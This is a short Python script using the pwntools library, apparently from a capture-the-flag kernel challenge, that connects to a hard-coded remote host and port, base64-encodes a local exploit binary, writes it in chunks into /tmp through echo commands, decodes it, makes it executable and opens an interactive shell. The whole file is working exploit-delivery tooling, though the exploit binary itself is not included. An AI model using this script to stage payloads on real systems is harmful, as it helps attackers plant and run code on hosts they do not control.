```python
from pwn import *
#context(log_level='debug')
#io = process("./boot.sh")
io = remote("183.129.189.60",10015)

def exec_cmd(cmd):
    io.sendline(cmd)
    io.recvuntil("$ ")

def upload():
    p = log.progress("Upload")
    with open("./exp", "rb") as f:
        data = f.read()
    encoded = base64.b64encode(data)
    io.recvuntil("$ ")

    for i in range(0, len(encoded), 600):
        p.status("%d / %d" % (i, len(encoded)))
        exec_cmd("echo \"%s\" >> /tmp/benc" % (encoded[i:i+600]))

    exec_cmd("cat /tmp/benc | base64 -d > /tmp/bout")
    exec_cmd("chmod +x /tmp/bout")

upload()
io.interactive()
```

